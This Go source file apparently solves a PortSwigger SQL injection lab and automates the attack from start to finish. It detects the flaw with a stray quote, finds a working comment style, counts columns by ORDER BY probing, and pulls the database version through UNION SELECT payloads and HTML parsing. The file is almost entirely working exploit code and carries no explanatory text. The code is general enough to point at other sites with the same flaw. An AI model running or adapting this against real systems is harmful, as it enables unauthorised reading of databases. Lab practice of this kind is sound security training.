package sqli

import (
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/PuerkitoBio/goquery"
	"github.io/kinasr/pen_payloads/PortSwiggerLabs/SQLi/lab_7/utility"
	"github.io/kinasr/pen_payloads/PortSwiggerLabs/SQLi/lab_7/constant"
)

func DoesVulnerabilityExist(client *utility.HTTPClient, targetURL string) (bool, error) {
	response, err := client.SendGetRequest(targetURL + "'")
	if err != nil {
		return false, err
	}
	defer utility.SafeClose(response.Body)
	if response.StatusCode == http.StatusInternalServerError {
		// If we get a 500 error, it indicates that the server is vulnerable to SQL injection
		return true, nil
	}
	return false, nil
}

func FindCommentStyle(client *utility.HTTPClient, targetURL string) (string, error) {
	// Test each comment style
	for _, style := range constant.CommentStyles {
		testURL := targetURL + "'" + style
		response, err := client.SendGetRequest(utility.URLEncode(testURL))
		if err != nil {
			return "", err
		}
		defer utility.SafeClose(response.Body)
		if response.StatusCode == http.StatusOK {
			// If we get a 200 OK, it indicates that the comment style is valid
			return style, nil
		}
	}
	return "", fmt.Errorf("could not determine comment style, none of the styles worked: %v", constant.CommentStyles)
}

// FindNumOfColumns determines the number of columns in the vulnerable query result set
// using the ORDER BY technique.
func FindNumOfColumns(client *utility.HTTPClient, targetURL string, commentStyle string) (int, error) {
	for col := 1; col <= 100; col++ { // Limit search to 100 columns
		testURL := targetURL + "' ORDER BY " + fmt.Sprintf("%d", col) + commentStyle
		response, err := client.SendGetRequest(utility.URLEncode(testURL))
		if err != nil {
			return 0, err
		}
		defer utility.SafeClose(response.Body)
		if response.StatusCode == http.StatusInternalServerError {
			// If we get a 500 error, it indicates that the ORDER BY index is out of bounds
			if col == 1 {
				return 0, fmt.Errorf("no columns found, the first column is out of bounds")
			}
			return col - 1, nil
		}
	}
	return 0, fmt.Errorf("could not determine number of columns")
}


func GetDatabaseVersion(client *utility.HTTPClient, targetURL string, commentStyle string, numOfColumns int) (string, error) {
	// Test each database type
	for _, db := range constant.Databases {
		// If a comment style is provided, only test databases that use that style
		if commentStyle != "" {
			found := false
			for _, style := range db.Comment {
				if style == commentStyle {
					found = true
					break
				}
			}
			if !found {
				continue
			}
		}

		// Construct the UNION SELECT payload with NULLs and the version function
		selectColumns := make([]string, numOfColumns)
		for i := range numOfColumns {
			selectColumns[i] = "NULL"
		}
		selectColumns[0] = db.VersionFunction // Assuming the first column is where the version is displayed
		testURL := targetURL + "' UNION SELECT " + strings.Join(selectColumns, ",") + commentStyle
		response, err := client.SendGetRequest(utility.URLEncode(testURL))
		if err != nil {
			return "", err
		}
		defer utility.SafeClose(response.Body)
		if response.StatusCode == http.StatusOK {

			// Read and parse the response body
			bodyBytes, err := io.ReadAll(response.Body)
			if err != nil {
				return "", fmt.Errorf("failed to read response body: %w", err)
			}
			responseText := string(bodyBytes)

			// Parse the HTML to find the database version
			// This parsing logic is specific to the expected HTML structure of the lab response.
			doc, err := goquery.NewDocumentFromReader(strings.NewReader(responseText))
			if err != nil {
				return "", fmt.Errorf("failed to parse response HTML: %w", err)
			}

			dbVersion := ""
			// The lab usually presents results in a table. We look for the 'th' containing
			// the database version in the last row of the table.
			doc.Find("tr").Last().Find("th").EachWithBreak(func(_ int, th *goquery.Selection) bool {
				dbVersion = strings.TrimSpace(th.Text())
				return false // Stop after the first th in the last tr
			})

			if dbVersion != "" {
				return dbVersion, nil
			}
		}
	}
	return "", fmt.Errorf("could not determine database type")
}
